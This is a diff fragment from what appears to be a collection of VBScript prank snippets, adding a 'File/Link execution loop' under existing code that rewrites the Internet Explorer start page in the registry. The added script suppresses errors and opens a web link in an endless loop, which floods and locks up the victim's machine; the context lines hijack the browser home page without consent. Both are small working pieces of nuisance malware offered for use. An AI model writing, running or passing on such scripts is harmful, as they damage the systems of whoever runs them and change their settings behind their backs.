@@ -48,6 +48,20 @@ Set wsc = CreateObject("WScript.Shell")
 wsc.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.wescam.u"
 
 -------------------------------------
+--------File/Link execution loop--------
 
+Decription: This code basically executes a File or web link on
+a loop.
+
+Here is the code:
+-------------------------------------
+
+On Error Resume Next
+Set wsc = CreateObject("WScript.Shell")
+Do
+wsc.Run "http://www.rrlf.de/", 3, False
+Loop
+
+-------------------------------------
 
 
